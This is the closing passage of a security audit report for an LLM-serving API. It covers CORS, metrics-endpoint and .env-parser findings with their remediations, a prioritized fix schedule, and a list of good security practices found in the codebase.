- Health check configured
- No secrets in build layers
- `.pyc` and test files stripped from production image

### VULN-DOCKER-05: No Secrets in `.env.example` (POSITIVE)

| Field | Value |
|---|---|
| **ID** | VULN-DOCKER-05 |
| **Severity** | **None** (positive finding) |

`.env.example` contains only empty placeholders for secrets:
```
SMR_V2_AZURE_API_KEY=
SMR_V2_SERVICE_TOKEN=
SMR_V2_OPENAI_COMPAT_API_KEY=not-needed
```

No real credentials found. The `not-needed` value for OpenAI compat is intentional for local models.

---

## 13. Additional Findings

### VULN-CORS-01: Wildcard CORS Methods and Headers

| Field | Value |
|---|---|
| **ID** | VULN-CORS-01 |
| **Severity** | **LOW** |
| **File** | `main.py:198-202` |
| **CWE** | CWE-942 (Overly Permissive CORS) |

```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.cors_origins,
    allow_credentials=True,
    allow_methods=["*"],       # Allows DELETE, PATCH, etc.
    allow_headers=["*"],       # Allows all headers
)
```

While CORS is disabled by default (`cors_enabled=false`), when enabled with `allow_credentials=True` + `allow_headers=["*"]`, this is overly permissive. Combined with a misconfigured `cors_origins`, it could allow cross-origin credential theft.

**Remediation:** Restrict to needed methods and headers:
```python
allow_methods=["GET", "POST"],
allow_headers=["Content-Type", "X-Service-Token", "X-Request-ID"],
```

### VULN-AUTH-01: Auth Bypass on Metrics Endpoint

| Field | Value |
|---|---|
| **ID** | VULN-AUTH-01 |
| **Severity** | **MEDIUM** |
| **File** | `api/middleware/auth.py:19-28`, `main.py:235` |
| **CWE** | CWE-862 (Missing Authorization) |

The `/metrics` endpoint is in `EXEMPT_PATHS` (no auth required):

```python
EXEMPT_PATHS: frozenset[str] = frozenset({
    "/metrics",
    ...
})
```

The Prometheus metrics endpoint exposes:
- Provider names and models in use
- Request counts, latencies, error rates
- Queue sizes, circuit breaker states
- Active generation counts

This is operational intelligence that should be restricted in production.

**Remediation:** Remove `/metrics` from `EXEMPT_PATHS` or add separate metrics authentication.

### VULN-MISC-01: Custom .env Parser — Possible Injection

| Field | Value |
|---|---|
| **ID** | VULN-MISC-01 |
| **Severity** | **LOW** |
| **File** | `core/config.py:159-188` |
| **CWE** | CWE-20 |

The `_load_dotenv_into_environ()` function implements a custom `.env` parser instead of using `python-dotenv`. The parser strips quotes but doesn't handle:
- Multiline values
- Escaped characters
- Variable expansion (`${VAR}`)
- Comments after values (`KEY=value # comment` → value includes `# comment`)

This could lead to unexpected config values if `.env` files contain complex values.

**Remediation:** Replace with `python-dotenv` (already a dependency):
```python
from dotenv import load_dotenv
load_dotenv(override=False)
```

---

## Summary of Remediation Priorities

### Immediate (Critical — Fix Before Next Deploy)

| ID | Finding | Effort |
|---|---|---|
| CVE-DEP-01 | Pin `h11>=0.16.0` to fix request smuggling | 5 min |
| VULN-SSRF-01 | Add URL validation + CIDR blocking on Ollama `base_url` | 2 hours |
| VULN-LEAK-01 | Sanitize `str(exc)` before Redis storage and logging | 1 hour |

### Short-term (High — Fix Within 1 Week)

| ID | Finding | Effort |
|---|---|---|
| VULN-SSRF-02 | Validate OpenAI-compat and Azure endpoint URLs | 1 hour |
| VULN-RACE-01 | Add `asyncio.Lock` to CircuitBreaker | 30 min |
| VULN-SSE-01 | Add max stream duration and handle expired tasks | 1 hour |
| VULN-RES-01 | Add global rate limiting middleware | 2 hours |
| VULN-RES-02 | Validate/restrict Prometheus label cardinality | 1 hour |
| VULN-RES-03 | Add semaphore to streaming background tasks | 30 min |
| VULN-LEAK-02 | Sanitize streaming error messages | 30 min |

### Medium-term (Medium — Fix Within 1 Month)

| ID | Finding | Effort |
|---|---|---|
| VULN-PI-01 | Change guardrail default to "block" | 5 min |
| VULN-PI-02 | Extend injection pattern coverage | 4 hours |
| VULN-REDIS-02 | Add Redis authentication | 1 hour |
| VULN-INT-01 | Add `max_tokens` upper bound | 5 min |
| VULN-INT-02 | Add `max_retries` upper bound | 5 min |
| VULN-RES-04 | Fix or remove non-functional queue consumer | 4 hours |
| VULN-RACE-02 | Add lock to ShutdownManager | 30 min |
| VULN-RACE-03 | Fix semaphore acquire/release race | 30 min |
| VULN-AUTH-01 | Restrict metrics endpoint access | 30 min |
| VULN-DNS-01 | Add DNS rebinding protection | 4 hours |
| VULN-DOCKER-01 | Fix docker-compose env_file | 5 min |

### Long-term (Low/Informational — Next Release)

| ID | Finding | Effort |
|---|---|---|
| VULN-REDIS-01 | Add Lua field allowlist | 30 min |
| VULN-INT-03 | Guard backoff early return | 5 min |
| VULN-CORS-01 | Restrict CORS methods/headers | 15 min |
| VULN-DOCKER-02 | Rotate Grafana password | 5 min |
| VULN-DOCKER-03 | Enable OTEL TLS | 1 hour |
| VULN-MISC-01 | Replace custom .env parser | 30 min |

---

## Positive Security Findings

These patterns demonstrate good security engineering:

1. **Timing-safe auth** — `hmac.compare_digest()` for token comparison (auth.py:47)
2. **SecretStr for credentials** — API keys use Pydantic `SecretStr`, never logged by default (config.py:34,72)
3. **Atomic Redis updates** — Lua script for task updates prevents TOCTOU (task_manager.py:21-41)
4. **Pydantic validation** — All request models have type constraints, min/max lengths (requests.py)
5. **UUID4 task IDs** — Unpredictable, no enumeration (task_manager.py:59)
6. **Structured logging** — No string interpolation with user data (structlog throughout)
7. **Non-root Docker** — Production container runs as UID 1001 (Dockerfile:78)
8. **Health check** — Kubernetes-ready liveness/readiness probes (health.py)
9. **Output guardrails** — Scans LLM output for leaked credentials (guardrails.py:100-113)
10. **Sanitized SSE errors** — Error chunks don't expose raw exceptions (generate.py:474)
11. **No eval/exec** — Zero code execution with user input anywhere in codebase
12. **No subprocess** — No shell command execution in any code path

---

*Report generated 2026-03-24. Next scan recommended after dependency updates or architecture changes.*
